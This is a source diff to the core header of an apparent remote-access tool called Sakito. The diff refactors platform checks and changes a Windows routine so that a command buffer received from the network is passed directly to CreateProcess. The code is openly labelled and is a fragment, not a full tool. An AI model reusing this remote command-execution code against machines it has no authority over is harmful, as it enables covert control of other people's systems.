@@ -2,6 +2,7 @@
 Coded by d4rkstat1c.
 Use educationally/legally.
 */
+#include "os_check.h"
 #ifndef SAKITO_CORE_H
 #define SAKITO_CORE_H
 
@@ -14,7 +15,10 @@ Use educationally/legally.
 #define FTRANSFER_START "1"
 #define DIR_NOT_FOUND '0'
 
-#if defined(_WIN32) || defined(_WIN64) || (defined(__CYGWIN__) && !defined(_WIN32))
+#if OS_WIN
+	#include <WS2tcpip.h>
+	#include <Windows.h>
+	#include <inttypes.h>
 	HANDLE sakito_win_openf(const LPCTSTR filename, const DWORD desired_access, const DWORD creation_dispostion) 
 	{
 		return CreateFile(filename,
@@ -101,12 +105,10 @@ Use educationally/legally.
 		}
 
 		// 7 + 1 for null termination/string truncation.
-		char cmd[BUFLEN+8] = "cmd /C ";
-		strcat(cmd, buf);
 
 		// Create the child process.
 		BOOL i_result = CreateProcess(NULL, 
-						cmd,
+						buf,
 						NULL,
 						NULL,
 						TRUE,
@@ -129,7 +131,7 @@ Use educationally/legally.
 	}
 #endif
 
-// Inline function to copy uint64_t bytes to new memory block/location to abide strict aliasing.
+// Function to copy uint64_t bytes to new memory block/location to abide strict aliasing.
 static inline uint64_t ntohll_conv(char* const buf) 
 {
 	uint64_t new;
@@ -137,16 +139,6 @@ static inline uint64_t ntohll_conv(char* const buf)
 
 	// Return deserialized bytes.
 	return ntohll(new);
-}
-
-// Inline function to copy uint32_t bytes to new memory block/location to abide strict aliasing.
-static inline uint32_t ntohl_conv(char* const buf) 
-{
-	uint32_t new;
-	memcpy(&new, buf, sizeof(new));
-
-	// Return deserialized bytes.
-	return ntohl(new);
 }
 
 #endif
